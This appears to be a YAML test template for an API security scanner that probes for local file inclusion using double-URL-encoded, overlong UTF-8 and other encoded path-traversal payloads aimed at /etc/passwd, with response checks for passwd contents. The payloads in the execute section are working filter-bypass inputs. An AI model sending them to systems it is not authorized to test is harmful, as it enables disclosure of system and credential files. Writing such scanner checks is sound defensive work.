id: LFI_BY_ENCODED_TRAVERSAL
info:
  name: "Local File Inclusion via URL-Encoded Path Traversal"
  description: "Tests for LFI vulnerabilities using double URL encoding and Unicode encoding to bypass path traversal filters."
  details: >
    "Many web application firewalls and input validation routines block simple ../ sequences
    but may miss double-URL-encoded (%252e%252e%252f), Unicode-encoded (%c0%ae%c0%ae/),
    or mixed-encoding variants. This test uses various encoding techniques to bypass
    naive traversal detection and reach sensitive system files."
  impact: "Bypass of security filters protecting against path traversal, leading to
    disclosure of sensitive files, source code, and server configuration with the
    same impact as direct path traversal attacks."
  category:
    name: LFI
    shortName: LFI
    displayName: Local File Inclusion
  subCategory: LFI_BY_ENCODED_TRAVERSAL
  severity: HIGH
  tags:
    - OWASP top 10
    - Business logic
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
    - "https://cwe.mitre.org/data/definitions/22.html"
  cwe:
    - CWE-22
    - CWE-116
  cve:
    - CVE-2021-41773

attributes:
  nature: INTRUSIVE
  plan: FREE
  duration: FAST

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    neq: "OPTIONS"
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
      - "root:x:"

execute:
  type: single
  requests:
    - req:
        - add_query_param:
            file: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        - add_query_param:
            file: "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
        - add_query_param:
            file: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        - add_query_param:
            file: "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        - add_query_param:
            file: "..%255c..%255c..%255cetc%255cpasswd"
        - add_query_param:
            path: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

validate:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    contains_either:
      - "root:x:"
      - "root:0:0"
      - "/bin/bash"
      - "/bin/sh"
      - "daemon:x:"
      - "nobody:x:"
